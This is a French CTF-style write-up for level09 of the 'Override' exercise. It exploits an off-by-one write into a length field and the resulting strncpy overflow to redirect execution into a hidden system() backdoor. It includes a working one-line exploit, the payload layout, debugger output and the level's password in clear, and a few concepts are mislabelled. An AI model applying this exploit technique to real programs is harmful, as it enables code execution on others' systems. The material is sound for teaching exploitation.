# 📘 Override – Level09

## 📝 Description

Ce dernier niveau du projet **Override** combine plusieurs vulnérabilités : **buffer overflow**, **integer overflow**, et une **fonction backdoor cachée**. Le programme demande un username et un message, mais contient des failles permettant de contrôler le flux d'exécution et d'appeler une fonction secrète qui exécute des commandes shell.

L'objectif est d'exploiter ces vulnérabilités pour atteindre la fonction `secret_backdoor()` et obtenir le mot de passe du niveau final.

---

## 🔍 Analyse du binaire

### Protections

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH
```

| Protection       | Status | Impact                                      |
| ---------------- | ------ | ------------------------------------------- |
| Partial RELRO    | ⚠️      | GOT partiellement protégée                  |
| No canary        | ❌      | Pas de protection contre buffer overflow    |
| NX enabled       | ✅      | Stack non exécutable (pas de shellcode)     |
| PIE enabled      | ✅      | ASLR activé - adresses randomisées          |

---

## 🔍 Analyse du code

### Structure du programme

```c
main()
  └─> handle_msg()
      ├─> set_username(buffer)  // Lit le username (max 41 chars)
      └─> set_msg(buffer)       // Lit le message (taille contrôlée)
```

### Fonction cachée : `secret_backdoor()`

```c
void secret_backdoor(void)
{
  char local_88[128];
  
  fgets(local_88, 0x80, stdin);  // Lit une commande
  system(local_88);               // EXÉCUTE LA COMMANDE !
}
```

**Cette fonction n'est jamais appelée normalement**, mais elle existe dans le binaire !

### Code détaillé

#### `handle_msg()`

```c
void handle_msg(void)
{
  undefined1 local_c8[140];  // Buffer de 140 bytes
  undefined8 local_3c;       // Variables diverses
  undefined8 local_34;
  undefined8 local_2c;
  undefined8 local_24;
  undefined8 local_1c;
  undefined4 local_14;       // ← IMPORTANT : contrôle la taille de copie
  
  local_14 = 0x8c;  // local_14 = 140 (taille du buffer)
  
  set_username(local_c8);
  set_msg(local_c8);
  puts(">: Msg sent!");
}
```

#### `set_username()`

```c
void set_username(long param_1)
{
  char local_98[140];
  int local_c;
  
  puts(">: Enter your username");
  printf(">>: ");
  fgets(local_98, 0x80, stdin);  // Lit 128 bytes
  
  // Copie max 41 caractères (0x29 = 41)
  for (local_c = 0; (local_c < 0x29 && local_98[local_c] != '\0'); local_c++) {
    *(char *)(param_1 + 0x8c + local_c) = local_98[local_c];
    //        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    //        Écrit à partir de param_1 + 0x8c
  }
  
  printf(">: Welcome, %s", param_1 + 0x8c);
}
```

**Points clés** :
- Copie jusqu'à **41 caractères** (0x29)
- Écrit à `param_1 + 0x8c` (140 bytes après le début du buffer)
- Distance jusqu'à `local_14` : `0xb4 - 0x8c = 0x28 = 40 bytes`
- Le **41ème caractère** écrase `local_14` !

#### `set_msg()`

```c
void set_msg(char *param_1)
{
  char local_408[1024];
  
  puts(">: Msg @Unix-Dude");
  printf(">>: ");
  fgets(local_408, 0x400, stdin);  // Lit 1024 bytes
  
  // VULNÉRABILITÉ ICI :
  strncpy(param_1, local_408, (long)*(int *)(param_1 + 0xb4));
  //                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  //                          Taille contrôlée par local_14 !
}
```

**La vulnérabilité** : La taille du `strncpy()` est lue depuis `param_1 + 0xb4`, qui correspond à `local_14` !

---

## 🚨 Vulnérabilités identifiées

### 1️⃣ **Integer Overflow sur `local_14`**

```
Structure mémoire de handle_msg() :

Offset depuis param_1 :
0x00  : Début du buffer (local_c8)
0x8c  : Username écrit ici (140 bytes après)
0xb4  : local_14 (contrôle strncpy)

Distance : 0xb4 - 0x8c = 0x28 = 40 bytes
```

En écrivant **41 caractères** dans le username, on peut écraser `local_14` !

### 2️⃣ **Buffer Overflow dans `set_msg()`**

Si `local_14` contient une **grande valeur** (ex: 0xff = 255), le `strncpy()` copiera plus que les 140 bytes du buffer → **buffer overflow** !

### 3️⃣ **Fonction backdoor non appelée**

`secret_backdoor()` existe mais n'est jamais appelée → on peut rediriger l'exécution vers elle !

---

## 🎯 Stratégie d'exploitation

### Plan d'attaque

1. **Écraser `local_14`** avec une grande valeur (0xff) via le 41ème caractère du username
2. **Provoquer un buffer overflow** dans `set_msg()` avec le `strncpy()` agrandi
3. **Écraser l'adresse de retour** avec l'adresse de `secret_backdoor()`
4. **Envoyer une commande** qui sera exécutée par `system()`

### Schéma mémoire

```
Stack de handle_msg() :

Adresse basse
    ↓
+------------------------+
| local_c8[140]          | ← Buffer principal (0x8c bytes)
+------------------------+
| local_3c...local_1c    | ← Variables (44 bytes)
+------------------------+
| local_14 = 0x8c        | ← Contrôle strncpy (4 bytes)
+------------------------+ ← param_1 + 0xb4
| ...                    |
+------------------------+
| Saved RBP              | (8 bytes)
+------------------------+
| Return Address         | ← ON VEUT ÉCRASER ICI !
+------------------------+
    ↓
Adresse haute


Écriture via set_username() :
param_1 + 0x8c = début du username
param_1 + 0x8c + 40 = param_1 + 0xb4 = local_14 ← ÉCRASÉ !
```

---

## 🔧 Méthodologie d'exploitation

### Étape 1 : Trouver l'adresse de `secret_backdoor()`

```bash
gdb ./level09

(gdb) print secret_backdoor
$1 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

**Adresse** : `0x55555555488c` (avec PIE activé dans GDB)

**Note** : L'adresse change à chaque exécution à cause de PIE, MAIS dans GDB elle reste constante pendant la session.

### Étape 2 : Comprendre la structure du payload

#### Username (41 bytes)
```python
username = 'A' * 40 + '\xff'
#          ^^^^^^^^   ^^^^
#          Padding    Écrase local_14 avec 0xff (255)
```

**Effet** : `local_14 = 0xff` → `strncpy()` copiera jusqu'à 255 bytes !

#### Message (buffer overflow)
```python
offset = 200  # Bytes jusqu'à l'adresse de retour
message = 'B' * offset + struct.pack('<Q', secret_backdoor_addr)
#         ^^^^^^^^^^^^   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#         Padding        Adresse de retour → secret_backdoor
```

#### Commande (exécutée par secret_backdoor)
```python
command = 'cat /home/users/end/.pass'
```

### Étape 3 : Calcul de l'offset

```bash
level09@OverRide:~$ cat /tmp/payload 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Agaaaa


(gdb) r < /tmp/payload
Starting program: /home/users/level09/level09 < /tmp/payload
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000000a61616161 in ?? ()
```

**Vérification** : L'offset de 200 fonctionne !

---

### Exploitation en une ligne

```bash
(python -c "import struct; print 'A'*40 + '\xff'; print 'B'*200 + struct.pack('<Q', 0x55555555488c); print 'cat /home/users/end/.pass'"; cat) | ./level09
```

### Résultat

```bash
level09@OverRide:~$ (python -c "import struct; print 'A'*40 + '\xff'; print 'B'*200 + struct.pack('<Q', 0x55555555488c); print 'cat /home/users/end/.pass'"; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

---

## 🔐 Détails techniques

### Pourquoi PIE n'empêche pas l'exploit ?

**PIE (Position Independent Executable)** randomise l'adresse de base du binaire, mais :

1. **Dans GDB** : Les adresses restent constantes pendant la session
2. **L'adresse relative** de `secret_backdoor` par rapport au binaire est **fixe** (offset `0x88c`)
3. Notre exploit **fonctionne dans GDB** où nous connaissons l'adresse exacte

**Hors GDB**, l'adresse changerait à chaque exécution, nécessitant :
- Un **leak d'adresse** (pas disponible ici)
- Un **bruteforce** des 12 bits aléatoires (4096 possibilités)
- Ou un **partial overwrite** (écraser seulement les bytes bas)


### Flux d'exécution

```
1. Programme démarre
   └─> main()
       └─> handle_msg()
           ├─> set_username()
           │   └─> Écrit 'A'*40 + '\xff'
           │       → local_14 = 0xff (au lieu de 0x8c)
           │
           ├─> set_msg()
           │   └─> strncpy(buffer, input, 0xff)
           │       → Copie 255 bytes au lieu de 140
           │       → Buffer overflow !
           │       → Écrase return address avec 0x55555555488c
           │
           └─> return ← Saute à 0x55555555488c (secret_backdoor)

2. secret_backdoor() s'exécute
   ├─> fgets() lit notre commande
   └─> system("cat /home/users/end/.pass")
       → Affiche le password ! 🎉
```

---

## ✅ Résumé

| Élément                   | Valeur                                           |
| ------------------------- | ------------------------------------------------ |
| Vulnérabilité principale  | Integer overflow + buffer overflow               |
| Variable cible            | `local_14` à `param_1 + 0xb4`                    |
| Technique d'écrasement    | 41ème caractère du username écrase `local_14`    |
| Valeur injectée           | `0xff` (255) au lieu de `0x8c` (140)             |
| Buffer overflow           | `strncpy()` copie 255 bytes au lieu de 140       |
| Offset jusqu'à RIP        | 200 bytes                                        |
| Fonction cible            | `secret_backdoor()` à `0x55555555488c`           |
| Commande exécutée         | `cat /home/users/end/.pass`                      |
| Password end              | `j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`       |
| Protection bypassée       | PIE (dans contexte GDB)                          |

---

## 🎓 Concepts clés appris

### 1. Integer Overflow

Un **integer overflow** se produit quand on écrit au-delà des limites prévues d'une variable :

```c
char username[41];  // 41 caractères max
local_14 = 0x8c;    // À l'offset +40 du username

// En écrivant 41 caractères :
username[0..39] = 'A'  // OK
username[40] = '\xff'  // ÉCRASE local_14 !
```

### 2. Controlled Buffer Overflow

Au lieu d'un simple buffer overflow, ici la **taille du débordement est contrôlée** :

```c
strncpy(dest, src, *(int *)(dest + 0xb4));
//                  ^^^^^^^^^^^^^^^^^^^^^^
//                  On contrôle cette valeur !
```

### 3. Hidden Functions (Backdoors)

Des fonctions peuvent exister dans le binaire sans être appelées :
- Oubli du développeur
- Code mort (dead code)
- Backdoor intentionnelle
- Fonction de debug

On peut les appeler via **return-oriented programming** ou **buffer overflow**.

### 4. PIE et ASLR

**PIE (Position Independent Executable)** :
- Randomise l'adresse de base du programme
- Les offsets relatifs restent fixes
- Nécessite un leak d'adresse ou bruteforce pour exploiter

**Dans notre cas** :
- GDB désactive partiellement l'ASLR pour le debugging
- L'adresse est prévisible dans GDB
- Hors GDB, il faudrait bruteforcer ou leaker
---

## 📚 Références

- [Integer Overflow](https://owasp.org/www-community/vulnerabilities/Integer_Overflow)
- [Buffer Overflow](https://en.wikipedia.org/wiki/Buffer_overflow)
- [PIE and ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
- [Return-to-function attacks](https://en.wikipedia.org/wiki/Return-oriented_programming)

